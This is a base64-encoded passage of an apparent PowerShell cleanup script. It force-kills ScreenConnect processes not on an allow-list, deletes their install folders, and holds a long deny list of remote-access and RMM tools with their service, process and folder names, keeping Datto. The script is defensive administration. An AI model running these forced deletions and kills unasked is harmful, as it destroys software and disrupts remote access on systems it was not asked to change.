eGVjdXRhYmxlUGF0aCBpcyBudWxsKQogICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3Mg
LUZpbHRlciAiTmFtZSBsaWtlICdTY3JlZW5Db25uZWN0JSciIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICRleGUgPSAkXy5FeGVjdXRhYmxl
UGF0aAogICAgICAgICRjbWQgPSAkXy5Db21tYW5kTGluZQogICAgICAgICRrZWVwZXIgPSAoSXMt
S2VlcGVyICRleGUpIC1vciAoSXMtS2VlcGVyICRjbWQpCiAgICAgICAgaWYgKC1ub3QgJGtlZXBl
cikgewogICAgICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAtRm9yY2UgLUVy
cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgJG4ucHJvYysrOyBMb2cgInBy
b2Nfa2lsbGVkIHBpZD0kKCRfLlByb2Nlc3NJZCkgZXhlPSRleGUiCiAgICAgICAgfQogICAgfQoK
ICAgICMgNC4gZm9yZWlnbiBTQyBpbnN0YWxsIGRpcnMgKFBGICsgUEY4NikKICAgIGZvcmVhY2gg
KCRiYXNlIGluIEAoJGVudjpQcm9ncmFtRmlsZXMsICR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSkp
IHsKICAgICAgICBpZiAoLW5vdCAkYmFzZSAtb3IgLW5vdCAoVGVzdC1QYXRoICRiYXNlKSkgeyBj
b250aW51ZSB9CiAgICAgICAgR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGJhc2UgLURpcmVj
dG9yeSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBX
aGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0KicgfSB8IEZvckVhY2gt
T2JqZWN0IHsKICAgICAgICAgICAgICAgICRkID0gJF8uRnVsbE5hbWUKICAgICAgICAgICAgICAg
IGlmIChJcy1LZWVwZXIgJGQpIHsgcmV0dXJuIH0KICAgICAgICAgICAgICAgIGlmIChGb3JjZS1S
ZW1vdmVEaXIgJGQpIHsgJG4uZGlyKys7IExvZyAiZGlyX3JlbW92ZWQgJGQiIH0KICAgICAgICAg
ICAgICAgIGVsc2UgeyAkbi5mYWlsKys7IExvZyAiZGlyX1JFTU9WRV9GQUlMRUQgJGQiIH0KICAg
ICAgICAgICAgfQogICAgfQoKICAgICMgNS4gZGlzYWxsb3dlZCBSTU0gLyByZW1vdGUtYWNjZXNz
IHRvb2xzIChtYXJrZXQgY292ZXJhZ2UgMjAyNikuCiAgICAjIEtFRVAgZm9yZXZlcjogRGF0dG8v
Q2VudHJhU3RhZ2UgKyBTY3JlZW5Db25uZWN0IGtlZXAgRlBzIChoYW5kbGVkIGFib3ZlKS4KICAg
ICMgTkVWRVIgcHV0IERhdHRvL0NlbnRyYVN0YWdlL0NhZ1NlcnZpY2UgaW4gdGhpcyBsaXN0Lgog
ICAgZnVuY3Rpb24gSXMtRGF0dG9LZWVwZXIoW3N0cmluZ10kcykgewogICAgICAgIGlmICgtbm90
ICRzKSB7IHJldHVybiAkZmFsc2UgfQogICAgICAgIHJldHVybiBbYm9vbF0oJHMgLW1hdGNoICco
P2kpRGF0dG98Q2VudHJhU3RhZ2V8Q2FnU2VydmljZXxBdXRvdGFza0VuZHBvaW50JykKICAgIH0K
ICAgICRybW0gPSBAKAogICAgICAgIEB7IFRhZz0nQW55RGVzayc7ICAgICAgU3ZjPUAoJ0FueURl
c2snKTsgUHJvYz1AKCdBbnlEZXNrJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQW55RGVz
ayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBbnlEZXNrIiwiJGVudjpQcm9ncmFtRGF0YVxB
bnlEZXNrIik7IFByb2Q9QCgnQW55RGVzayonKSB9CiAgICAgICAgQHsgVGFnPSdUZWFtVmlld2Vy
JzsgICBTdmM9QCgnVGVhbVZpZXdlcionKTsgUHJvYz1AKCdUZWFtVmlld2VyKicsJ3R2X3czMion
LCd0dl94NjQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVGVhbVZpZXdlciIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxUZWFtVmlld2VyIik7IFByb2Q9QCgnVGVhbVZpZXdlcionKSB9
CiAgICAgICAgQHsgVGFnPSdTcGxhc2h0b3AnOyAgICBTdmM9QCgnU3BsYXNodG9wKicsJ1NSU2Vy
dmljZScsJ1NTVVNlcnZpY2UnKTsgUHJvYz1AKCdTcGxhc2h0b3AqJywnc3Ryd2luY2x0KicsJ1NS
TWFuYWdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTcGxhc2h0b3AiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cU3BsYXNodG9wIik7IFByb2Q9QCgnU3BsYXNodG9wKicpIH0KICAg
ICAgICBAeyBUYWc9J0xvZ01lSW4nOyAgICAgIFN2Yz1AKCdMb2dNZUluJywnTE1JR3VhcmRpYW5T
dmMnLCdMTUlpZ25pdGlvbicpOyBQcm9jPUAoJ0xvZ01lSW4qJywnTE1JR3VhcmRpYW4qJywnUmFT
ZXJ2ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTG9nTWVJbiIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxMb2dNZUluIik7IFByb2Q9QCgnTG9nTWVJbionKSB9CiAgICAgICAgQHsg
VGFnPSdHb1RvJzsgICAgICAgICBTdmM9QCgnR29Ub015UEMqJywnR29Ub0Fzc2lzdConLCdHb1Rv
UmVzb2x2ZSonKTsgUHJvYz1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ2cybSonLCdHb1Rv
UmVzb2x2ZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb1RvTXlQQyIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxHb1RvTXlQQyIpOyBQcm9kPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Np
c3QqJywnR29UbyBSZXNvbHZlKicsJ0dvVG9NZWV0aW5nKicsJ0dvVG8gQ29ubmVjdConKSB9CiAg
ICAgICAgQHsgVGFnPSdSdXN0RGVzayc7ICAgICBTdmM9QCgnUnVzdERlc2snLCdydXN0ZGVzayon
KTsgUHJvYz1AKCdydXN0ZGVzayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSdXN0RGVz
ayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSdXN0RGVzayIpOyBQcm9kPUAoJ1J1c3REZXNr
KicpIH0KICAgICAgICBAeyBUYWc9J1N1cHJlbW8nOyAgICAgIFN2Yz1AKCdTdXByZW1vKicpOyBQ
cm9jPUAoJ1N1cHJlbW8qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3VwcmVtbyIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTdXByZW1vIik7IFByb2Q9QCgnU3VwcmVtbyonKSB9CiAg
ICAgICAgQHsgVGFnPSdEV1NlcnZpY2UnOyAgICBTdmM9QCgnRFdBZ2VudCcsJ2R3YWdlbnQqJyk7
IFByb2M9QCgnZHdhZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xEV0FnZW50Iiwi
JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERXQWdlbnQiLCIkZW52OlByb2dyYW1EYXRhXERXQWdl
bnQiKTsgUHJvZD1AKCdEV0FnZW50KicsJ0RXU2VydmljZSonKSB9CiAgICAgICAgQHsgVGFnPSda
b2hvQXNzaXN0JzsgICBTdmM9QCgnWm9ob0Fzc2lzdConLCdab2hvTWVldGluZyonKTsgUHJvYz1A
KCdab2hvQXNzaXN0KicsJ1pvaG9VUlNCKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFpv
aG9NZWV0aW5nIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFpvaG9NZWV0aW5nIik7IFByb2Q9
QCgnWm9obyBBc3Npc3QqJywnWm9ob01lZXRpbmcqJykgfQogICAgICAgIEB7IFRhZz0nUmVtb3Rl
UEMnOyAgICAgU3ZjPUAoJ1JlbW90ZVBDKicpOyBQcm9jPUAoJ1JlbW90ZVBDKicsJ1JQQ1N1aXRl
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJlbW90ZVBDIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XFJlbW90ZVBDIik7IFByb2Q9QCgnUmVtb3RlUEMqJykgfQogICAgICAgIEB7IFRh
Zz0nQm9tZ2FyJzsgICAgICAgU3ZjPUAoJ2JvbWdhcionLCdCZXlvbmRUcnVzdConKTsgUHJvYz1A
KCdib21nYXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQm9tZ2FyIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XEJvbWdhciIsIiRlbnY6UHJvZ3JhbUZpbGVzXEJleW9uZFRydXN0Iiwi
JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEJleW9uZFRydXN0Iik7IFByb2Q9QCgnQm9tZ2FyKics
J0JleW9uZFRydXN0KicpIH0KICAgICAgICBAeyBUYWc9J1BhcnNlYyc7ICAgICAgIFN2Yz1AKCdQ
YXJzZWMqJyk7IFByb2M9QCgncGFyc2VjZConLCdwc2VydmljZSonKTsgRGlycz1AKCIkZW52OlBy
b2dyYW1GaWxlc1xQYXJzZWMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUGFyc2VjIiwiJGVu
djpQcm9ncmFtRGF0YVxQYXJzZWMiKTsgUHJvZD1AKCdQYXJzZWMqJykgfQogICAgICAgIEB7IFRh
Zz0nQ2hyb21lUkQnOyAgICAgU3ZjPUAoJ2Nocm9tb3RpbmcqJyk7IFByb2M9QCgncmVtb3Rpbmdf
aG9zdConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb29nbGVcQ2hyb21lIFJlbW90ZSBE
ZXNrdG9wIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdvb2dsZVxDaHJvbWUgUmVtb3RlIERl
c2t0b3AiKTsgUHJvZD1AKCdDaHJvbWUgUmVtb3RlIERlc2t0b3AqJykgfQogICAgICAgIEB7IFRh
Zz0nVWx0cmFWTkMnOyAgICAgU3ZjPUAoJ3V2bmMqJywnd2ludm5jKicpOyBQcm9jPUAoJ3dpbnZu
YyonLCd1dm5jKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFVsdHJhVk5DIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XFVsdHJhVk5DIik7IFByb2Q9QCgnVWx0cmFWTkMqJywnV2luVk5D
KicpIH0KICAgICAgICBAeyBUYWc9J1RpZ2h0Vk5DJzsgICAgIFN2Yz1AKCd0dm5zZXJ2ZXIqJyk7
IFByb2M9QCgndHZuc2VydmVyKicsJ3R2bnZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
aWxlc1xUaWdodFZOQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxUaWdodFZOQyIpOyBQcm9k
PUAoJ1RpZ2h0Vk5DKicpIH0KICAgICAgICBAeyBUYWc9J1JlYWxWTkMnOyAgICAgIFN2Yz1AKCd2
bmNzZXJ2ZXIqJyk7IFByb2M9QCgndm5jc2VydmVyKicsJ3ZuY3ZpZXdlcionKTsgRGlycz1AKCIk
ZW52OlByb2dyYW1GaWxlc1xSZWFsVk5DIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlYWxW
TkMiKTsgUHJvZD1AKCdWTkMgU2VydmVyKicsJ1JlYWxWTkMqJykgfQogICAgICAgIEB7IFRhZz0n
RGFtZVdhcmUnOyAgICAgU3ZjPUAoJ0RhbWVXYXJlKicpOyBQcm9jPUAoJ0RXUkNTKicsJ0RXUkND
KicsJ0RhbWVXYXJlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNvbGFyV2luZHMiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU29sYXJXaW5kcyIsIiRlbnY6UHJvZ3JhbUZpbGVzXERh
bWVXYXJlIFJlbW90ZSBTdXBwb3J0IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERhbWVXYXJl
IFJlbW90ZSBTdXBwb3J0Iik7IFByb2Q9QCgnRGFtZVdhcmUqJykgfQogICAgICAgIEB7IFRhZz0n
TmV0U3VwcG9ydCc7ICAgU3ZjPUAoJ05ldFN1cHBvcnQqJyk7IFByb2M9QCgnY2xpZW50MzIqJywn
cGNpY3RsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5ldFN1cHBvcnQiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cTmV0U3VwcG9ydCIpOyBQcm9kPUAoJ05ldFN1cHBvcnQqJykgfQog
ICAgICAgIEB7IFRhZz0nU2ltcGxlSGVscCc7ICAgU3ZjPUAoJ1NpbXBsZUhlbHAqJyk7IFByb2M9
QCgnU2ltcGxlU2VydmljZSonLCdzaW1wbGVzZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
bUZpbGVzXFNpbXBsZUhlbHAiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2ltcGxlSGVscCIp
OyBQcm9kPUAoJ1NpbXBsZUhlbHAqJykgfQogICAgICAgIEB7IFRhZz0nR2V0U2NyZWVuJzsgICAg
U3ZjPUAoJ0dldFNjcmVlbionKTsgUHJvYz1AKCdHZXRTY3JlZW4qJyk7IERpcnM9QCgiJGVudjpQ
cm9ncmFtRmlsZXNcR2V0U2NyZWVuIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdldFNjcmVl
biIpOyBQcm9kPUAoJ0dldFNjcmVlbionKSB9CiAgICAgICAgQHsgVGFnPSdJcGVyaXVzJzsgICAg
ICBTdmM9QCgnSXBlcml1cyonKTsgUHJvYz1AKCdJcGVyaXVzUmVtb3RlKicpOyBEaXJzPUAoIiRl
bnY6UHJvZ3JhbUZpbGVzXElwZXJpdXMgUmVtb3RlIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XElwZXJpdXMgUmVtb3RlIik7IFByb2Q9QCgnSXBlcml1cyonKSB9CiAgICAgICAgQHsgVGFnPSdJ
U0xPbmxpbmUnOyAgIFN2Yz1AKCdJU0xsaWdodConKTsgUHJvYz1AKCdJU0xsaWdodConLCdJU0xB
bHdheXNPbionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xJU0wgT25saW5lIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XElTTCBPbmxpbmUiKTsgUHJvZD1AKCdJU0wgTGlnaHQqJywnSVNM
IEFsd2F5c09uKicpIH0KICAgICAgICBAeyBUYWc9J0FtbXl5JzsgICAgICAgIFN2Yz1AKCdBbW15
eSonKTsgUHJvYz1AKCdBbW15eSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBbW15eSIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBbW15eSIpOyBQcm9kPUAoJ0FtbXl5KicpIH0KICAg
ICAgICBAeyBUYWc9J1VsdHJhVmlld2VyJzsgIFN2Yz1AKCdVbHRyYVZpZXdlcionKTsgUHJvYz1A
KCdVbHRyYVZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xVbHRyYVZpZXdlciIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxVbHRyYVZpZXdlciIpOyBQcm9kPUAoJ1VsdHJhVmll
d2VyKicpIH0KICAgICAgICBAeyBUYWc9J0Flcm9BZG1pbic7ICAgIFN2Yz1AKCdBZXJvQWRtaW4q
Jyk7IFByb2M9QCgnQWVyb0FkbWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFlcm9B
ZG1pbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBZXJvQWRtaW4iKTsgUHJvZD1AKCdBZXJv
QWRtaW4qJykgfQogICAgICAgIEB7IFRhZz0nTGl0ZU1hbmFnZXInOyAgU3ZjPUAoJ0xpdGVNYW5h
Z2VyKicpOyBQcm9jPUAoJ1JPTVNlcnZlcionLCdST01WaWV3ZXIqJyk7IERpcnM9QCgiJGVudjpQ
cm9ncmFtRmlsZXNcTGl0ZU1hbmFnZXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGl0ZU1h
bmFnZXIiKTsgUHJvZD1AKCdMaXRlTWFuYWdlcionKSB9CiAgICAgICAgQHsgVGFnPSdSYWRtaW4n
OyAgICAgICBTdmM9QCgnUmFkbWluKicpOyBQcm9jPUAoJ3JzZXJ2ZXIzKicsJ1JhZG1pbionKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSYWRtaW4gU2VydmVyIDMiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cUmFkbWluIFNlcnZlciAzIik7IFByb2Q9QCgnUmFkbWluKicpIH0KICAgICAg
ICBAeyBUYWc9J05vTWFjaGluZSc7ICAgIFN2Yz1AKCdueHNlcnZlcionLCdueGQqJyk7IFByb2M9
QCgnbnhkKicsJ254c2VydmVyKicsJ254cnVubmVyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
bGVzXE5vTWFjaGluZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOb01hY2hpbmUiKTsgUHJv
ZD1AKCdOb01hY2hpbmUqJykgfQogICAgICAgIEB7IFRhZz0nTmluamFPbmUnOyAgICAgU3ZjPUAo
J05pbmphUk1NQWdlbnQnLCduaW5qYXJtbSonLCdOaW5qYVJNTSonKTsgUHJvYz1AKCdOaW5qYVJN
TUFnZW50KicsJ25pbmphcm1tKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5pbmphUk1N
QWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmluamFSTU1BZ2VudCIsIiRlbnY6UHJv
Z3JhbURhdGFcTmluamFSTU1BZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE5pbmphT25lIiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5pbmphT25lIik7IFByb2Q9QCgnTmluamFSTU0qJywnTmlu
amFPbmUqJykgfQogICAgICAgIEB7IFRhZz0nQXRlcmEnOyAgICAgICAgU3ZjPUAoJ0F0ZXJhQWdl
bnQnKTsgUHJvYz1AKCdBdGVyYUFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFU
RVJBIE5ldHdvcmtzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFURVJBIE5ldHdvcmtzIiwi
JGVudjpQcm9ncmFtRGF0YVxBVEVSQSBOZXR3b3JrcyIpOyBQcm9kPUAoJ0F0ZXJhKicpIH0KICAg
ICAgICBAeyBUYWc9J0Nvbm5lY3RXaXNlJzsgIFN2Yz1AKCdMVFNlcnZpY2UnLCdMVFN2Y01vbicp
OyBQcm9jPUAoJ0xUU3ZjKicsJ0xUVHJheSonKTsgRGlycz1AKCIkZW52OndpbmRpclxMVFN2YyIs
IiRlbnY6UHJvZ3JhbUZpbGVzXExhYlRlY2ggQ2xpZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XExhYlRlY2ggQ2xpZW50Iik7IFByb2Q9QCgnQ29ubmVjdFdpc2UgQXV0b21hdGUqJywnQ29u
bmVjdFdpc2UgUk1NKicsJ0xhYlRlY2gqJykgfQogICAgICAgIEB7IFRhZz0nS2FzZXlhJzsgICAg
ICAgU3ZjPUAoJ0FnZW50TW9uJywnS2FzZXlhKicsJ0tBQURTKicpOyBQcm9jPUAoJ0FnZW50TW9u
KicsJ0thc2V5YSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xLYXNleWEiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cS2FzZXlhIik7IFByb2Q9QCgnS2FzZXlhIFZTQSonLCdLYXNleWEg
QWdlbnQqJykgfQogICAgICAgIEB7IFRhZz0nTmFibGUnOyAgICAgICAgU3ZjPUAoJ0FkdmFuY2Vk
IE1vbml0b3JpbmcgQWdlbnQqJywnTi1hYmxlKicsJ05DZW50cmFsKicpOyBQcm9jPUAoJ0ZpbGVT
eXN0ZW1BZ2VudConLCdOQ2VudHJhbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBZHZh
bmNlZCBNb25pdG9yaW5nIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFkdmFuY2Vk
IE1vbml0b3JpbmcgQWdlbnQiLCIkZW52OlByb2dyYW1GaWxlc1xOLWFibGUgVGVjaG5vbG9naWVz
IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE4tYWJsZSBUZWNobm9sb2dpZXMiLCIkZW52OlBy
b2dyYW1GaWxlc1xNU1BBIEZpbGVzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1TUEEgRmls
ZXMiKTsgUHJvZD1AKCdBZHZhbmNlZCBNb25pdG9yaW5nIEFnZW50KicsJ04tYWJsZSonLCdOLWNl
bnRyYWwqJywnTi1zaWdodConLCdUYWtlIENvbnRyb2wqJywnU29sYXJXaW5kcyBNU1AqJykgfQog
ICAgICAgIEB7IFRhZz0nU3luY3JvJzsgICAgICAgU3ZjPUAoJ1N5bmNybyonLCdLYWJ1dG8qJyk7
IFByb2M9QCgnU3luY3JvKicsJ0thYnV0byonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xS
ZXBhaXJUZWNoIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlcGFpclRlY2giLCIkZW52OlBy
b2dyYW1GaWxlc1xTeW5jcm8iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU3luY3JvIiwiJGVu
djpQcm9ncmFtRGF0YVxTeW5jcm8iKTsgUHJvZD1AKCdTeW5jcm8qJywnS2FidXRvKicsJ1JlcGFp
clRlY2gqJykgfQogICAgICAgIEB7IFRhZz0nUHVsc2V3YXknOyAgICAgU3ZjPUAoJ1B1bHNld2F5
KicsJ1BDIE1vbml0b3IqJyk7IFByb2M9QCgnUENNb25pdG9yTWdyKicsJ1BDTW9uaXRvck1hbmFn
ZXIqJywnUHVsc2V3YXkqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUHVsc2V3YXkiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUHVsc2V3YXkiLCIkZW52OlByb2dyYW1GaWxlc1xQQyBN
b25pdG9yIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFBDIE1vbml0b3IiKTsgUHJvZD1AKCdQ
dWxzZXdheSonLCdQQyBNb25pdG9yKicpIH0KICAgICAgICBAeyBUYWc9J1N1cGVyT3BzJzsgICAg
IFN2Yz1AKCdTdXBlck9wcyonKTsgUHJvYz1AKCdTdXBlck9wcyonKTsgRGlycz1AKCIkZW52OlBy
b2dyYW1GaWxlc1xTdXBlck9wcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTdXBlck9wcyIs
IiRlbnY6UHJvZ3JhbURhdGFcU3VwZXJPcHMiKTsgUHJvZD1AKCdTdXBlck9wcyonKSB9CiAgICAg
ICAgQHsgVGFnPSdMZXZlbCc7ICAgICAgICBTdmM9QCgnTGV2ZWwqJyk7IFByb2M9QCgnbGV2ZWwq
Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTGV2ZWwiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cTGV2ZWwiLCIkZW52OlByb2dyYW1EYXRhXExldmVsIik7IFByb2Q9QCgnTGV2ZWwqJykg
fQogICAgICAgIEB7IFRhZz0nQWN0aW9uMSc7ICAgICAgU3ZjPUAoJ0FjdGlvbjEqJyk7IFByb2M9
QCgnQWN0aW9uMSonLCdhY3Rpb24xX2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XEFjdGlvbjEiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWN0aW9uMSIsIiRlbnY6UHJvZ3Jh
bURhdGFcQWN0aW9uMSIpOyBQcm9kPUAoJ0FjdGlvbjEqJykgfQogICAgICAgIEB7IFRhZz0nTWFu
YWdlRW5naW5lJzsgU3ZjPUAoJ01hbmFnZUVuZ2luZSonLCdVRU1TKicsJ0RDQWdlbnQqJyk7IFBy
b2M9QCgnTWFuYWdlRW5naW5lKicsJ2RjYWdlbnQqJywnVUVNUyonKTsgRGlycz1AKCIkZW52OlBy
b2dyYW1GaWxlc1xNYW5hZ2VFbmdpbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWFuYWdl
RW5naW5lIik7IFByb2Q9QCgnTWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRGVza3RvcCBDZW50cmFs
KicsJ0VuZHBvaW50IENlbnRyYWwqJywnUk1NIENlbnRyYWwqJykgfQogICAgICAgIEB7IFRhZz0n
VGFjdGljYWxSTU0nOyAgU3ZjPUAoJ3RhY3RpY2Fscm1tKicsJ01lc2ggQWdlbnQnLCdNZXNoQWdl
bnQnKTsgUHJvYz1AKCd0YWN0aWNhbHJtbSonLCdtZXNoYWdlbnQqJywnTWVzaEFnZW50KicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRhY3RpY2FsQWdlbnQiLCIke2VudjpQcm9ncmFtRmls
ZXMoeDg2KX1cVGFjdGljYWxBZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE1lc2ggQWdlbnQiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWVzaCBBZ2VudCIpOyBQcm9kPUAoJ1RhY3RpY2FsKics
J01lc2ggQWdlbnQqJywnTWVzaENlbnRyYWwqJykgfQogICAgICAgIEB7IFRhZz0nTWVzaENlbnRy
YWwnOyAgU3ZjPUAoJ01lc2ggQWdlbnQnLCdNZXNoQWdlbnQnLCdNZXNoQ2VudHJhbConKTsgUHJv
Yz1AKCdNZXNoQWdlbnQqJywnTWVzaENlbnRyYWwqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
ZXNcTWVzaCBBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNZXNoIEFnZW50Iik7IFBy
b2Q9QCgnTWVzaCpBZ2VudConLCdNZXNoQ2VudHJhbConKSB9CiAgICAgICAgQHsgVGFnPSdDb250
aW51dW0nOyAgICBTdmM9QCgnU0FBWionLCdDb250aW51dW0qJyk7IFByb2M9QCgnU0FBWionLCdD
b250aW51dW0qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU0FBWk9EIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFNBQVpPRCIsIiRlbnY6UHJvZ3JhbUZpbGVzXENvbnRpbnV1bSIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxDb250aW51dW0iKTsgUHJvZD1AKCdDb250aW51dW0qJywn
U0FBWionKSB9CiAgICAgICAgQHsgVGFnPSdOYXZlcmlzayc7ICAgICBTdmM9QCgnTmF2ZXJpc2sq
Jyk7IFByb2M9QCgnTmF2ZXJpc2sqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmF2ZXJp
c2siLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmF2ZXJpc2siKTsgUHJvZD1AKCdOYXZlcmlz
ayonKSB9CiAgICAgICAgQHsgVGFnPSdJbW15Qm90JzsgICAgICBTdmM9QCgnSW1teUJvdConLCdJ
bW15KicpOyBQcm9jPUAoJ0ltbXlBZ2VudConLCdJbW15Qm90KicpOyBEaXJzPUAoIiRlbnY6UHJv
Z3JhbUZpbGVzXEltbXlCb3QiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cSW1teUJvdCIsIiRl
bnY6UHJvZ3JhbURhdGFcSW1teUJvdCIpOyBQcm9kPUAoJ0ltbXlCb3QqJykgfQogICAgICAgIEB7
IFRhZz0nQXV0b21veCc7ICAgICAgU3ZjPUAoJ2FtYWdlbnQqJywnQXV0b21veConKTsgUHJvYz1A
KCdhbWFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEF1dG9tb3giLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cQXV0b21veCIsIiRlbnY6UHJvZ3JhbURhdGFcYW1hZ2VudCIpOyBQ
cm9kPUAoJ0F1dG9tb3gqJykgfQogICAgICAgIEB7IFRhZz0nQWNyb25pc0N5YmVyJzsgU3ZjPUAo
J0Fjcm9uaXMqJyk7IFByb2M9QCgnYWNyb2NtZConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
c1xBY3JvbmlzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFjcm9uaXMiKTsgUHJvZD1AKCdB
